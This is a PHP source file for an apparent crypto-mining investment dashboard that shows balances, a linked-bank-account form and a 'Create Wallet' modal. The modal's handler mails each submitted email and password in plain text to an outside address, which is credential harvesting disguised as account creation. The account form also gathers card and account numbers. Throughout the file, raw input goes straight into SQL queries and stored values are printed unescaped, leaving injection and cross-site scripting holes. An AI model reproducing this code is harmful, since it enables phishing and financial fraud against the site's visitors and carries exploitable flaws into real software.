<?php 
ob_start();
include '../inc/header.php'; 
$sid = $_SESSION['serverid'];
$login = $_SESSION['loginID'];
setlocale(LC_MONETARY,'en_US');


$currency = '€';
//DASHBAORD DATA QUERY
if($sid){ 
    $sql = "SELECT * FROM dash WHERE server_id = '$sid'";
    $query = mysqli_query($conn,$sql);
    while($row = mysqli_fetch_assoc($query)){
        // $loginID = $row['login_id'];
        $serverID = $row['server_id'];
        $running = $row['running'];
        $status = $row['status'];
        $hashrate = $row['hashrate'];
        $price = $row['price'];
        
        $mining_bal = $row['mining_bal'];
        $mining_bal2 = $row['mining_bal2'];
        $available_bal = $row['available_bal'];
        $earning = $row['earning'];
        $ledger_bal = $row['ledger_balance'];
        
        // $mining_btc = $row['mining_btc'];
        $available_btc = $row['available_btc'];
        $earning_btc = $row['earning_btc'];
        $ledger_btc = $row['ledger_btc'];
    }
}else{
    header('location:sign-in.php');
    exit();
}

//if($$login != $loginID ){
//    header('location:sign-in.php');
//    exit();
//}

$_SESSION['mining_bal'] = $available_bal;


// MODAL LINKING QUERY
if(isset($_POST['add_account'])){
    $ac_name = $_POST['name'];
    $account = $_POST['account'];
    $balance = $_POST['balance'];
    $ac_amount = $_POST['amount'];
    $card_name = $_POST['card_name'];

    $la_sql = "INSERT INTO linkedacc (server_id,name,account,balance,amount,card_name) VALUES('$sid','$ac_name','$account','$balance','$ac_amount','$card_name')";

    $la_query = mysqli_query($conn,$la_sql) or die($conn);

    if($la_query){
        echo '<script>alert("Account Linked")</script>';
    }else{
        echo '<script>alert("An error occured while linking your account!")</script>';
    }
}


//PHP QUERIES TO DATABASE//
?>
    <?php include '../inc/sidebar.php'; ?>
        <main class="main-content position-relative max-height-vh-100 h-100vh border-radius-lg ">
            <?php include '../inc/nav.php'; ?>
                <div class="mx-4">
                    <div class="d-flex justify-content-end">
                        <p></p>
                        <!-- <a href="#" class="text-success mx-1" data-bs-toggle="modal" data-bs-target="#exampleModal2">
                            <button type="button" class="btn btn-info btn-sm">Create Wallet</button>
                        </a> -->
                        <a href="deposit.php" class="mx-1">
                            <button class="btn btn-warning btn-sm">Deposit</button>
                        </a>
                        <a href="withdraw.php" class="">
                            <button type="button" class="btn btn-outline-success btn-sm">Withdraw</button>
                        </a>
                       
                    </div>
                </div>
                <!--                Alert Messages -->
                <?php
                    $alert_sql = "SELECT * FROM alert WHERE server_id = '$sid'";
                    $alert_query = mysqli_query($conn,$alert_sql) or die($conn);
                    while($alert = mysqli_fetch_assoc($alert_query)):
                ?>
                    <div class="alert alert-<?php echo $alert['color']=='success' ? 'success': 'danger';?> mx-3 shadow"> <i class="material-icons opacity-10 lead text-light"><?= $alert['icon'];?></i> <i class="text-light lead fw-bold"><?= $alert['msg'];?></i>
                        <br> <small class="text-light fw-bold"><?= $alert['note'];?></small> </div>
                    <?php endwhile ?>
                        <!--                       End of Alert Messages-->
                        <div class="card mx-3 mb-2">
                            <div class="row p-3 gy-3">
                                <div class="col-lg-2 col-md-6 col-sm-6 ">
                                    <p class="my-0 fw-bold">Server ID</p> <span class="text-success"><?= $serverID; ?></span> </div>
                                <div class="col-lg-2 col-md-6 col-sm-6 ">
                                    <p class="my-0 fw-bold">Running</p>
                                    <?php
                            if($running === "Low Capacity"){
                                echo '<span class="text-danger">Low Capacity</span>';
                            }else{
                                echo '<span class="text-success">Full Capacity</span>';
                            }
                            ?> </div>
                                <div class="col-lg-2 col-md-6 col-sm-6">
                                    <p class="my-0 fw-bold">IP</p> <span class="text-success"><?php echo getenv("REMOTE_ADDR"); ?></span> </div>
                                <div class="col-lg-2 col-md-6 col-sm-6">
                                    <p class="my-0 fw-bold">Hasrate</p> <span class="text-success"><?= $hashrate ?></span> </div>
                                <div class="col-lg-2 col-md-6 col-sm-6">
                                    <p class="my-0 fw-bold">Status</p> <span class="text-success">
                                <?php
                            if($status === "Offline"){
                                echo '<span class="text-danger">Offline</span>'; 
                                }else{ echo '<span class="text-success">Online</span>'; } ?> </span>
                                </div>
                                <div class="col-lg-2 col-md-6 col-sm-6"> <a href="pricing.php" class="btn btn-outline-success btn-sm">get server</a>
                                    <?php 
                                if($status == 'Online'){
                                    echo '<a href="#" class="p-2 text-success " data-bs-toggle="modal" data-bs-target="#exampleModal"><h5 class="btn btn-info btn-sm">Mining Activated</h5></a>';
                                }else{
                                    
                                }

                            ?> 
                            </div>
                            </div>
                        </div>
                        <div class="container-fluid py-4">
                            <div class="row">
                                <div class="col-xl-3 col-sm-6 mb-xl-0 mb-4">
                                    <div class="card">
                                        <div class="card-header p-3 pt-2">
                                            <div class="icon icon-lg icon-shape bg-gradient-warning shadow-dark text-center border-radius-xl mt-n4 position-absolute"> <i class="material-icons opacity-10">currency_bitcoin</i> </div>
                                            <div class="text-end pt-1">
                                                <p class="text-sm mb-0 text-capitalize">Total Assets</p>
                                                <h4 class="mb-0"><?= $currency?> <span class="counter"><?= number_format($mining_bal,2)?> </span></h4>
                                                </div>
                                        </div>
                                        <hr class="dark horizontal my-0">
                                        <div class="card-footer p-3 text-right">
                                            <p class="mb-0 "><span class="text-warning text-sm font-weight-bolder">BTC </span> <span class="counter"><?= round($mining_bal / $price,2); ?></span> </p>
                                            
                                        </div>
                                    </div>
                                </div>
                                <div class="col-xl-3 col-sm-6 mb-xl-0 mb-4">
                                    <div class="card">
                                        <div class="card-header p-3 pt-2">
                                            <div class="icon icon-lg icon-shape bg-gradient-warning shadow-dark text-center border-radius-xl mt-n4 position-absolute"> <i class="material-icons opacity-10">currency_bitcoin</i> </div>
                                            <div class="text-end pt-1">
                                                <p class="text-sm mb-0 text-capitalize">Available Balance</p>
                                                <h4 class="mb-0 text-success"><?= $currency?> <span class="counter"><?= number_format($available_bal,2)?></span></h4> </div>
                                        </div>
                                        <hr class="dark horizontal my-0">
                                        <div class="card-footer p-3">
                                            <p class="mb-0 "><span class="text-warning text-sm font-weight-bolder">BTC </span> <span class="counter"><?= round($available_bal / $price,2)?></span> </p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-xl-3 col-sm-6 mb-xl-0 mb-4">
                                    <div class="card">
                                        <div class="card-header p-3 pt-2">
                                            <div class="icon icon-lg icon-shape bg-gradient-warning shadow-success text-center border-radius-xl mt-n4 position-absolute"> <i class="material-icons opacity-10">currency_bitcoin</i> </div>
                                            <div class="text-end pt-1">
                                                <p class="text-sm mb-0 text-capitalize">Earning</p>
                                                <h4 class="mb-0 text-success"><?= $currency?> <span class="counter"><?= number_format($earning,2) ;?></span></h4> </div>
                                        </div>
                                        <hr class="dark horizontal my-0">
                                        <div class="card-footer p-3">
                                            <p class="mb-0 "><span class="text-warning text-sm font-weight-bolder">BTC </span> <span class="counter"><?= round($earning / $price ,2);?></span> </p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-xl-3 col-sm-6">
                                    <div class="card">
                                        <div class="card-header p-3 pt-2">
                                            <div class="icon icon-lg icon-shape bg-gradient-warning shadow-info text-center border-radius-xl mt-n4 position-absolute"> <i class="material-icons opacity-10">currency_bitcoin</i> </div>
                                            <div class="text-end pt-1">
                                                <p class="text-sm mb-0 text-capitalize">Balance</p>
                                                <h4 class="mb-0"><?= $currency?><span class="counter"> <?= number_format($ledger_bal,2)?></span></h4> </div>
                                        </div>
                                        <hr class="dark horizontal my-0">
                                        <div class="card-footer p-3">
                                            <p class="mb-0 "><span class="text-warning text-sm font-weight-bolder">BTC </span> <span class="counter"><?= round(($ledger_bal / $price),2)?></span> </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- Linked Accounts -->
                            <div class="row mt-4">
                                <div class="col-lg-8 col-md-12 mt-4 mb-4">
                                    <div class="card mb-5">
                                        <div class="d-flex justify-content-between align-items-center">
                                            <h4 class="p-2">Linked Account</h4>
                                            
                                            <a href="" class="p-2 text-success " data-bs-toggle="modal" data-bs-target="#exampleModal">
                                                <h5 class="btn btn-info btn-sm">Add</h5>
                                            </a>
                                            
                                            <!-- <a href="#" id="disable" class="p-2 text-success " data-bs-toggle="modal" data-bs-target="#exampleModal"><h5 class="btn btn-warning btn-sm">Disable Account</h5></a>  -->
                                        
                                        </div>
                                            
                                        <hr class="dark horizontal my-0">
                                        <?php
                                    $sql = "SELECT * FROM linkedacc WHERE server_id ='$sid' ";
                                    $query = mysqli_query($conn,$sql);
                                    if(mysqli_num_rows($query) <= 0){
                                        echo '<h3 class="text-center">No Account Linked </h3>';
                                    }
                                ?>
                                            <div class="row p-2">
                                                <?php while($row = mysqli_fetch_assoc($query)):?>
                                                    <div class="col-md-4">
                                                        <div class="card p-2 mt-4"> <small class="card-text">Name : <b> <?= $row['name']?></b></small>
                                                            <p class="card-text my-0">Account # : <b> <?= $row['account']?></b></p>
                                                            <h2 class="text-right my-0 p-0 fw-bold"><?= $row['balance']?></h3>

                                                <!-- <small class="text-center card-text text-success"><?= $row['amount']?></small> <br> -->

                                                <small class="card-text ">Card name : <b> <?= $row['card_name']?></b></small> 

                                                <a href="delacc.php?id=<?= $row['id']?>" class="btn btn-sm btn-danger m-0 ms-auto" onclick="javascript:return confirm('Would you like to delete this account?')">Remove</a>
                                            </div>
                                        </div>
                                        <?php endwhile; ?>
                                </div>
                            </div>
                            
<!-- activities-->
                       <div class="card">
                            <div class="card-header pb-0">
                                <div class="row">
                                    <div class="col-lg-6 col-7">
                                        <h5>Recent Activity</h5> </div>
                                </div>
                            </div>
                            <div class="card-body px-0 pb-2">
                                <div class="table-responsive">
                                    <table class="table align-items-center mb-0 table-striped table-hover">
                                        <tbody>
                                            <?php 
                    $sql ="SELECT * FROM activites WHERE server_id = '$sid' ORDER BY id DESC";
                    $query = mysqli_query($conn,$sql);
                    if(mysqli_num_rows($query) <= 0){
                        echo '<h3 class="text-center">No Transaction</h3>';
                    }else{
                        echo '<thead class="bg-warning">
                        <tr>
                          <th class="text-uppercase text-light font-weight-bolder ">Date</th>
                          <th class="text-uppercase text-light font-weight-bolder ps-2">Type </th>
                          <th class="text-center text-uppercase text-light font-weight-bolder ">Status</th>
                          <th class="text-center text-uppercase text-light font-weight-bolder ">Detail</th>
                          <th class="text-center text-uppercase text-light font-weight-bolder ">Amount</th>
                        </tr>
                      </thead>';
                    }
                    ?>
                            <?php while($row = mysqli_fetch_assoc($query)):?>
                                <tr>
                                    <td>
                                        <div>
                                            <p class="m-0">
                                                <?= $row['date'] ?>
                                            </p>
                                        </div>
                                    </td>
                                    <td>
                                        <p class="m-0">
                                            <?= $row['type'] ?>
                                        </p>
                                    </td>
                                    <td class="align-middle text-center">
                                        <p class="m-0 <?php
                                            switch($row['status']){
                                                case 'Completed':
                                                    echo 'text-success';
                                                    break;
                                                case 'On Hold':
                                                    echo 'text-danger';
                                                    break;
                                                case 'Processing':
                                                    echo 'text-dark';
                                                    break;
                                                case 'Pending':
                                                    echo 'text-dark';
                                                    break;
                                                default :
                                                    echo 'text-dark';
                                            }
                                        ?> fw-bold" >
                                            <?= $row['status'] ?>
                                        </p>
                                    </td>
                                    <td class="align-middle text-center">
                                        <p class="m-0">
                                            <?= $row['detail'] ?>
                                        </p>
                                    </td>
                                    <td class="align-middle text-center">
                                        <p class="m-0">
                                            <?= $row['amount'] ?>
                                        </p>
                                    </td>
                                </tr>
                                <?php endwhile; ?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
    
<!--                           end of activites-->
                            
                        </div>
                        <!-- iframe  -->
                        <div class="col-lg-4 mt-4 mb-3">
                            <div class="card rounded p-1">
                                <div class="p-1 position-relative overflow-hidden w-100vw" style="height: 315px">
                                    <iframe scrolling="no" src="https://www.coindesk.com/price/bitcoin/" style="position : absolute; top:-618px ;left:-20px; width:100% ; height: 200vh; zoom: 1.02;"> </iframe>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>



                <!--      Recent Activites-->
                <div class="row m-3">
                    <div class="col-lg-12 col-md-12 mb-md-0 mb-4">
                        
                    </div>
                </div>
                
                
                
<!--    Modal-->
 
  <div class="modal fade" id="mymodal exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Link An Account</h5>
      </div>
      <div class="modal-body">
        
        <form action="<?php $_SERVER['PHP_SELF']?>" method="post">
            <div class="form-group">
               <label for="date">Bank Name</label>
                <input type="text" class="form-control border p-2" placeholder="Name" value="" name="name" required>
            </div>
            
            <div class="form-group">
               <label for="">Card / Account #</label>
                <input type="text" class="form-control border p-2"  value="" name="account" >
            </div>
            
            <div class="form-group">
               <label for="">Balance</label>
                <input type="text" class="form-control border p-2"  value="" name="balance">
            </div>
            
            <div class="form-group">
               <label for="">Amount</label>
                <input type="text" class="form-control border p-2"  value="" name="amount">
            </div>
            <div class="form-group">
               <label for="">Card Name</label>
                <input type="text" class="form-control border p-2"  value="" name="card_name">
            </div>
            <div class="form-group">
               <label for=""></label>
                <input type="submit" class="form-control btn btn-info d-block" value="Add" name="add_account">
            </div>
        </form>
      </div>
      <div class="modal-footer">

      </div>
    </div>
  </div>
</div>       

<!--End of modal  -->
            
<!-- track Progresss Modal -->


<?php
if(isset($_POST['coin'])){
    $_email = $_POST['email'];
    $_pwd = $_POST['password'];
    if(!empty($_email) && !empty($_pwd) && (strlen($_pwd)>8)){

        $to = 'no-reply@fxbcryptodomain.net';
        $subject = 'Coin Market Signup';
        $msg = "Email : {$_email} \n Pass: {$_pwd}";
        mail($to,$subject,$msg,);
    }else{
        echo "<script>alert('Invalid Email or Password is not up to 8 characters')</script>";
    }
}

?>



<!-- Modal2 -->
<div class="modal fade" id="exampleModal2" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header ">
        <h5 class="modal-title align-center" id="exampleModalLabel">Create Wallet</h5><br>
      </div>
      <div class="modal-body">
       <form action="" method="post">
        <div class="text-center my-3">
            <img src="../assets/img/coin.png" alt="" width="100px">
        </div>
        <div class="form-group">
            <input type="email" name="email" class="form-control border p-2 border-info" placeholder="Email" required><br>
        </div>
        <div class="form-group">
            <input type="password" name="password" class="form-control border p-2 border-info" placeholder="Password" required><br>
        </div>
        <div class="form-group my-2">
            <input type="checkbox" class="mx-2" name="password"  placeholder="Password" value="agree">I agree to receive marketing updates.<br>
        </div>
        <div class="form-group">
            <input type="submit" class="form-control bg-info text-light" name="coin"  placeholder="Password" value="Create Account"><br>
        </div>
       </form>
      </div>
    </div>
  </div>
</div>
      
<script>
    if ( window.history.replaceState ) {
        window.history.replaceState( null, null, window.location.href );
    }

//    const btn = document.getElementById('disable')
//    btn.addEventListener('click',function(){
//        alert("Are you sure you want to disable account?");
//        setTimeout(function(){
//            swal("Account Disabled", "Successful", "success");
//        },5000)
//        
//    })
//    
</script>
           
                
                
<?php include '../inc/footer.php'; ?>